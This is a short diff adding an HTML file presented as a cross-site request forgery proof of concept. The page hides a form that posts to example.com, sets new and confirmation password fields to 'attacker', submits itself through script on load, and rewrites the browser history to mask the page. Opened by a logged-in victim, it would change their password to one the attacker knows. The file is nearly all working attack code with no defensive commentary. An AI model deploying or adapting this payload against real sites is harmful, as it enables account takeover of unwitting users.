@@ -1,0 +1,16 @@
+<html>
+  <title>
+    This CSRF was found by attacker
+  </title>
+  <body>
+    <script>history.pushState("", "", "/")</script>
+    <h1>
+      This POC was Created By 
+    </h1>
+    <form action="http://example.com" method="POST" enctype="application/x-www-form-urlencoded">
+      <input type="hidden" name="new_password" value="attacker" />
+      <input type="hidden" name="conf_password" value="attacker" />
+    </form>
+    <script>document.forms[0].submit();</script>
+  </body>
+</html>
